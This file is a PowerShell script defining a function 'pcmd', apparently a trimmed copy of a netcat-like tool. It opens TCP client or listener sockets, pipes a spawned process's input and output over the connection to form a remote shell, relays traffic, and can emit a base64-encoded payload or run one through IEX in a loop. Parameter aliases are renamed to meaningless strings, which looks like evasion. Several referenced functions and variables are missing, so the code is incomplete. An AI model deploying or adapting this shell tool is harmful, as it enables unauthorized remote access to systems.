function pcmd
{
  param(
    [alias("Client")][string]$c="",
    
    [alias("Port")][Parameter(Position=-1)][string]$p="",
    [alias("Execute")][string]$e="",
    
    [alias("dddd")][string]$r="",
    
    [alias("eee")][string]$dns="",
    
    [alias("rrr")][int32]$t=60,
    [Parameter(ValueFromPipeline=$True)][alias("Input")]$i=$null,
    [ValidateSet('Host', 'Bytes', 'String')][alias("OutputType")][string]$o="Host",
    [alias("ggg")][string]$of="",
    [alias("fdg")][switch]$d=$False,
    [alias("fgdfg")][switch]$rep=$False,
    [alias("gggf")][switch]$g=$False,
    [alias("fgfd")][switch]$ge=$False,
    [alias("Help")][switch]$h=$False
  )
  
 
  $global:Verbose = $Verbose
  if($of -ne ''){$o = 'Bytes'}
  if($dns -eq "")
  {
    if((($c -eq "") -and (!$l)) -or (($c -ne "") -and $l)){return "You must select either client mode (-c) or listen mode (-l)."}
    if($p -eq ""){return "Please provide a port number to -p."}
  }
  if(((($r -ne "") -and ($e -ne "")) -or (($e -ne "") -and ($ep))) -or  (($r -ne "") -and ($ep))){return "You can only pick one of these: -e, -ep, -r"}
  if(($i -ne $null) -and (($r -ne "") -or ($e -ne ""))){return "-i is not applicable here."}
  if($l)
  {
    $Failure = $False
    netstat -na | Select-String LISTENING | % {if(($_.ToString().split(":")[1].split(" ")[0]) -eq $p){Write-Output ("The selected port " + $p + " is already in use.") ; $Failure=$True}}
    if($Failure){break}
  }
  if($r -ne "")
  {
    if($r.split(":").Count -eq 2)
    {
      $Failure = $False
      netstat -na | Select-String LISTENING | % {if(($_.ToString().split(":")[1].split(" ")[0]) -eq $r.split(":")[1]){Write-Output ("The selected port " + $r.split(":")[1] + " is already in use.") ; $Failure=$True}}
      if($Failure){break}
    }
  }
  
  
  
  
  function Setup_TCP
  {
    param($FuncSetupVars)
    $c,$l,$p,$t = $FuncSetupVars
    if($global:Verbose){$Verbose = $True}
    $FuncVars = @{}
    if(!$l)
    {
      $FuncVars["l"] = $False
      $Socket = New-Object System.Net.Sockets.TcpClient
      Write-Verbose "Connecting..."
      $Handle = $Socket.BeginConnect($c,$p,$null,$null)
    }
    else
    {
      $FuncVars["l"] = $True
      Write-Verbose ("Listening on [0.0.0.0] (port " + $p + ")")
      $Socket = New-Object System.Net.Sockets.TcpListener $p
      $Socket.Start()
      $Handle = $Socket.BeginAcceptTcpClient($null, $null)
    }
    
    $Stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
    while($True)
    {
      if($Host.UI.RawUI.KeyAvailable)
      {
        if(@(17,27) -contains ($Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown").VirtualKeyCode))
        {
          Write-Verbose "CTRL or ESC caught. Stopping TCP Setup..."
          if($FuncVars["l"]){$Socket.Stop()}
          else{$Socket.Close()}
          $Stopwatch.Stop()
          break
        }
      }
      if($Stopwatch.Elapsed.TotalSeconds -gt $t)
      {
        if(!$l){$Socket.Close()}
        else{$Socket.Stop()}
        $Stopwatch.Stop()
        Write-Verbose "Timeout!" ; break
        break
      }
      if($Handle.IsCompleted)
      {
        if(!$l)
        {
          try
          {
            $Socket.EndConnect($Handle)
            $Stream = $Socket.GetStream()
            $BufferSize = $Socket.ReceiveBufferSize
            Write-Verbose ("Connection to " + $c + ":" + $p + " [tcp] succeeded!")
          }
          catch{$Socket.Close(); $Stopwatch.Stop(); break}
        }
        else
        {
          $Client = $Socket.EndAcceptTcpClient($Handle)
          $Stream = $Client.GetStream()
          $BufferSize = $Client.ReceiveBufferSize
          Write-Verbose ("Connection from [" + $Client.Client.RemoteEndPoint.Address.IPAddressToString + "] port " + $port + " [tcp] accepted (source port " + $Client.Client.RemoteEndPoint.Port + ")")
        }
        break
      }
    }
    $Stopwatch.Stop()
    if($Socket -eq $null){break}
    $FuncVars["Stream"] = $Stream
    $FuncVars["Socket"] = $Socket
    $FuncVars["BufferSize"] = $BufferSize
    $FuncVars["StreamDestinationBuffer"] = (New-Object System.Byte[] $FuncVars["BufferSize"])
    $FuncVars["StreamReadOperation"] = $FuncVars["Stream"].BeginRead($FuncVars["StreamDestinationBuffer"], 0, $FuncVars["BufferSize"], $null, $null)
    $FuncVars["Encoding"] = New-Object System.Text.AsciiEncoding
    $FuncVars["StreamBytesRead"] = 1
    return $FuncVars
  }
  function ReadData_TCP
  {
    param($FuncVars)
    $Data = $null
    if($FuncVars["StreamBytesRead"] -eq 0){break}
    if($FuncVars["StreamReadOperation"].IsCompleted)
    {
      $StreamBytesRead = $FuncVars["Stream"].EndRead($FuncVars["StreamReadOperation"])
      if($StreamBytesRead -eq 0){break}
      $Data = $FuncVars["StreamDestinationBuffer"][0..([int]$StreamBytesRead-1)]
      $FuncVars["StreamReadOperation"] = $FuncVars["Stream"].BeginRead($FuncVars["StreamDestinationBuffer"], 0, $FuncVars["BufferSize"], $null, $null)
    }
    return $Data,$FuncVars
  }
  function WriteData_TCP
  {
    param($Data,$FuncVars)
    $FuncVars["Stream"].Write($Data, 0, $Data.Length)
    return $FuncVars
  }
  function Close_TCP
  {
    param($FuncVars)
    try{$FuncVars["Stream"].Close()}
    catch{}
    if($FuncVars["l"]){$FuncVars["Socket"].Stop()}
    else{$FuncVars["Socket"].Close()}
  }
  
  
  
  function setup_command
  {
    param($FuncSetupVars)
    if($global:Verbose){$Verbose = $True}
    $FuncVars = @{}
    $ProcessStartInfo = New-Object System.Diagnostics.ProcessStartInfo
    $ProcessStartInfo.FileName = $FuncSetupVars[0]
    $ProcessStartInfo.UseShellExecute = $False
    $ProcessStartInfo.RedirectStandardInput = $True
    $ProcessStartInfo.RedirectStandardOutput = $True
    $ProcessStartInfo.RedirectStandardError = $True
    $FuncVars["Process"] = [System.Diagnostics.Process]::Start($ProcessStartInfo)
    Write-Verbose ("Starting Process " + $FuncSetupVars[0] + "...")
    $FuncVars["Process"].Start() | Out-Null
    $FuncVars["StdOutDestinationBuffer"] = New-Object System.Byte[] 65536
    $FuncVars["StdOutReadOperation"] = $FuncVars["Process"].StandardOutput.BaseStream.BeginRead($FuncVars["StdOutDestinationBuffer"], 0, 65536, $null, $null)
    $FuncVars["StdErrDestinationBuffer"] = New-Object System.Byte[] 65536
    $FuncVars["StdErrReadOperation"] = $FuncVars["Process"].StandardError.BaseStream.BeginRead($FuncVars["StdErrDestinationBuffer"], 0, 65536, $null, $null)
    $FuncVars["Encoding"] = New-Object System.Text.AsciiEncoding
    return $FuncVars
  }
  function ReadData_pcmd
  {
    param($FuncVars)
    [byte[]]$Data = @()
    if($FuncVars["StdOutReadOperation"].IsCompleted)
    {
      $StdOutBytesRead = $FuncVars["Process"].StandardOutput.BaseStream.EndRead($FuncVars["StdOutReadOperation"])
      if($StdOutBytesRead -eq 0){break}
      $Data += $FuncVars["StdOutDestinationBuffer"][0..([int]$StdOutBytesRead-1)]
      $FuncVars["StdOutReadOperation"] = $FuncVars["Process"].StandardOutput.BaseStream.BeginRead($FuncVars["StdOutDestinationBuffer"], 0, 65536, $null, $null)
    }
    if($FuncVars["StdErrReadOperation"].IsCompleted)
    {
      $StdErrBytesRead = $FuncVars["Process"].StandardError.BaseStream.EndRead($FuncVars["StdErrReadOperation"])
      if($StdErrBytesRead -eq 0){break}
      $Data += $FuncVars["StdErrDestinationBuffer"][0..([int]$StdErrBytesRead-1)]
      $FuncVars["StdErrReadOperation"] = $FuncVars["Process"].StandardError.BaseStream.BeginRead($FuncVars["StdErrDestinationBuffer"], 0, 65536, $null, $null)
    }
    return $Data,$FuncVars
  }
  function WriteData_pcmd
  {
    param($Data,$FuncVars)
    $FuncVars["Process"].StandardInput.WriteLine($FuncVars["Encoding"].GetString($Data).TrimEnd("`r").TrimEnd("`n"))
    return $FuncVars
  }
  function close_pcmd
  {
    param($FuncVars)
    $FuncVars["Process"] | Stop-Process
  }  
  
  


  
  
  
  
  
  function Main
  {
    param($Stream1SetupVars,$Stream2SetupVars)
    try
    {
      [byte[]]$InputToWrite = @()
      $Encoding = New-Object System.Text.AsciiEncoding
      if($i -ne $null)
      {
        Write-Verbose "Input from -i detected..."
        if(Test-Path $i){ [byte[]]$InputToWrite = ([io.file]::ReadAllBytes($i)) }
        elseif($i.GetType().Name -eq "Byte[]"){ [byte[]]$InputToWrite = $i }
        elseif($i.GetType().Name -eq "String"){ [byte[]]$InputToWrite = $Encoding.GetBytes($i) }
        else{Write-Host "Unrecognised input type." ; return}
      }
      
      Write-Verbose "Setting up Stream 1..."
      try{$Stream1Vars = Stream1_Setup $Stream1SetupVars}
      catch{Write-Verbose "Stream 1 Setup Failure" ; return}
      
      Write-Verbose "Setting up Stream 2..."
      try{$Stream2Vars = Stream2_Setup $Stream2SetupVars}
      catch{Write-Verbose "Stream 2 Setup Failure" ; return}
      
      $Data = $null
      
      if($InputToWrite -ne @())
      {
        Write-Verbose "Writing input to Stream 1..."
        try{$Stream1Vars = Stream1_WriteData $InputToWrite $Stream1Vars}
        catch{Write-Host "Failed to write input to Stream 1" ; return}
      }
      
      if($d){Write-Verbose "-d (disconnect) Activated. Disconnecting..." ; return}
      
      Write-Verbose "Both Communication Streams Established. Redirecting Data Between Streams..."
      while($True)
      {
        try
        {
          $Data,$Stream2Vars = Stream2_ReadData $Stream2Vars
          if(($Data.Length -eq 0) -or ($Data -eq $null)){Start-Sleep -Milliseconds 100}
          if($Data -ne $null){$Stream1Vars = Stream1_WriteData $Data $Stream1Vars}
          $Data = $null
        }
        catch
        {
          Write-Verbose "Failed to redirect data from Stream 2 to Stream 1" ; return
        }
        
        try
        {
          $Data,$Stream1Vars = Stream1_ReadData $Stream1Vars
          if(($Data.Length -eq 0) -or ($Data -eq $null)){Start-Sleep -Milliseconds 100}
          if($Data -ne $null){$Stream2Vars = Stream2_WriteData $Data $Stream2Vars}
          $Data = $null
        }
        catch
        {
          Write-Verbose "Failed to redirect data from Stream 1 to Stream 2" ; return
        }
      }
    }
    finally
    {
      try
      {
        #Write-Verbose "Closing Stream 2..."
        Stream2_Close $Stream2Vars
      }
      catch
      {
        Write-Verbose "Failed to close Stream 2"
      }
      try
      {
        #Write-Verbose "Closing Stream 1..."
        Stream1_Close $Stream1Vars
      }
      catch
      {
        Write-Verbose "Failed to close Stream 1"
      }
    }
  }
  
  
  
  if($u)
  {
    Write-Verbose "Set Stream 1: UDP"
    $FunctionString = ("function Stream1_Setup`n{`n" + ${function:Setup_UDP} + "`n}`n`n")
    $FunctionString += ("function Stream1_ReadData`n{`n" + ${function:ReadData_UDP} + "`n}`n`n")
    $FunctionString += ("function Stream1_WriteData`n{`n" + ${function:WriteData_UDP} + "`n}`n`n")
    $FunctionString += ("function Stream1_Close`n{`n" + ${function:Close_UDP} + "`n}`n`n")    
    if($l){$InvokeString = "Main @('',`$True,'$p','$t') "}
    else{$InvokeString = "Main @('$c',`$False,'$p','$t') "}
  }
  elseif($dns -ne "")
  {
    Write-Verbose "Set Stream 1: DNS"
    $FunctionString = ("function Stream1_Setup`n{`n" + ${function:Setup_DNS} + "`n}`n`n")
    $FunctionString += ("function Stream1_ReadData`n{`n" + ${function:ReadData_DNS} + "`n}`n`n")
    $FunctionString += ("function Stream1_WriteData`n{`n" + ${function:WriteData_DNS} + "`n}`n`n")
    $FunctionString += ("function Stream1_Close`n{`n" + ${function:Close_DNS} + "`n}`n`n")
    if($l){return "This feature is not available."}
    else{$InvokeString = "Main @('$c','$p','$dns',$dnsft) "}
  }
  else
  {
    Write-Verbose "Set Stream 1: TCP"
    $FunctionString = ("function Stream1_Setup`n{`n" + ${function:Setup_TCP} + "`n}`n`n")
    $FunctionString += ("function Stream1_ReadData`n{`n" + ${function:ReadData_TCP} + "`n}`n`n")
    $FunctionString += ("function Stream1_WriteData`n{`n" + ${function:WriteData_TCP} + "`n}`n`n")
    $FunctionString += ("function Stream1_Close`n{`n" + ${function:Close_TCP} + "`n}`n`n")
    if($l){$InvokeString = "Main @('',`$True,$p,$t) "}
    else{$InvokeString = "Main @('$c',`$False,$p,$t) "}
  }
  
  if($e -ne "")
  {
    Write-Verbose "Set Stream 2: Process"
    $FunctionString += ("function Stream2_Setup`n{`n" + ${function:setup_command} + "`n}`n`n")
    $FunctionString += ("function Stream2_ReadData`n{`n" + ${function:ReadData_pcmd} + "`n}`n`n")
    $FunctionString += ("function Stream2_WriteData`n{`n" + ${function:WriteData_pcmd} + "`n}`n`n")
    $FunctionString += ("function Stream2_Close`n{`n" + ${function:close_pcmd} + "`n}`n`n")
    $InvokeString += "@('$e')`n`n"
  }
  elseif($ep)
  {
    Write-Verbose "Set Stream 2: Powershell"
    $InvokeString += "`n`n"
  }
  elseif($r -ne "")
  {
    if($r.split(":")[0].ToLower() -eq "udp")
    {
      Write-Verbose "Set Stream 2: UDP"
      $FunctionString += ("function Stream2_Setup`n{`n" + ${function:Setup_UDP} + "`n}`n`n")
      $FunctionString += ("function Stream2_ReadData`n{`n" + ${function:ReadData_UDP} + "`n}`n`n")
      $FunctionString += ("function Stream2_WriteData`n{`n" + ${function:WriteData_UDP} + "`n}`n`n")
      $FunctionString += ("function Stream2_Close`n{`n" + ${function:Close_UDP} + "`n}`n`n")    
      if($r.split(":").Count -eq 2){$InvokeString += ("@('',`$True,'" + $r.split(":")[1] + "','$t') ")}
      elseif($r.split(":").Count -eq 3){$InvokeString += ("@('" + $r.split(":")[1] + "',`$False,'" + $r.split(":")[2] + "','$t') ")}
      else{return "Bad relay format."}
    }
    if($r.split(":")[0].ToLower() -eq "dns")
    {
      Write-Verbose "Set Stream 2: DNS"
      $FunctionString += ("function Stream2_Setup`n{`n" + ${function:Setup_DNS} + "`n}`n`n")
      $FunctionString += ("function Stream2_ReadData`n{`n" + ${function:ReadData_DNS} + "`n}`n`n")
      $FunctionString += ("function Stream2_WriteData`n{`n" + ${function:WriteData_DNS} + "`n}`n`n")
      $FunctionString += ("function Stream2_Close`n{`n" + ${function:Close_DNS} + "`n}`n`n")
      if($r.split(":").Count -eq 2){return "This feature is not available."}
      elseif($r.split(":").Count -eq 4){$InvokeString += ("@('" + $r.split(":")[1] + "','" + $r.split(":")[2] + "','" + $r.split(":")[3] + "',$dnsft) ")}
      else{return "Bad relay format."}
    }
    elseif($r.split(":")[0].ToLower() -eq "tcp")
    {
      Write-Verbose "Set Stream 2: TCP"
      $FunctionString += ("function Stream2_Setup`n{`n" + ${function:Setup_TCP} + "`n}`n`n")
      $FunctionString += ("function Stream2_ReadData`n{`n" + ${function:ReadData_TCP} + "`n}`n`n")
      $FunctionString += ("function Stream2_WriteData`n{`n" + ${function:WriteData_TCP} + "`n}`n`n")
      $FunctionString += ("function Stream2_Close`n{`n" + ${function:Close_TCP} + "`n}`n`n")
      if($r.split(":").Count -eq 2){$InvokeString += ("@('',`$True,'" + $r.split(":")[1] + "','$t') ")}
      elseif($r.split(":").Count -eq 3){$InvokeString += ("@('" + $r.split(":")[1] + "',`$False,'" + $r.split(":")[2] + "','$t') ")}
      else{return "Bad relay format."}
    }
  }
  else
  {
    Write-Verbose "Set Stream 2: Console"
    $FunctionString += ("function Stream2_Setup`n{`n" + ${function:Setup_Console} + "`n}`n`n")
    $FunctionString += ("function Stream2_ReadData`n{`n" + ${function:ReadData_Console} + "`n}`n`n")
    $FunctionString += ("function Stream2_WriteData`n{`n" + ${function:WriteData_Console} + "`n}`n`n")
    $FunctionString += ("function Stream2_Close`n{`n" + ${function:Close_Console} + "`n}`n`n")
    $InvokeString += ("@('" + $o + "')")
  }
  
  if($ep){$FunctionString += ("function Main`n{`n" + ${function:Main_Powershell} + "`n}`n`n")}
  else{$FunctionString += ("function Main`n{`n" + ${function:Main} + "`n}`n`n")}
  $InvokeString = ($FunctionString + $InvokeString)
  
  
  
  if($ge){Write-Verbose "Returning Encoded Payload1..." ; return [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($InvokeString))}
  elseif($g){Write-Verbose "Returning Payload1..." ; return $InvokeString}
  
  
  
  $Output = $null
  try
  {
    if($rep)
    {
      while($True)
      {
        $Output += IEX $InvokeString
        Start-Sleep -s 2
        Write-Verbose "Repetition Enabled: Restarting..."
      }
    }
    else
    {
      $Output += IEX $InvokeString
    }
  }
  finally
  {
    if($Output -ne $null)
    {
      if($of -eq ""){$Output}
      else{[io.file]::WriteAllBytes($of,$Output)}
    }
  }
  ########## EXECUTION ##########
}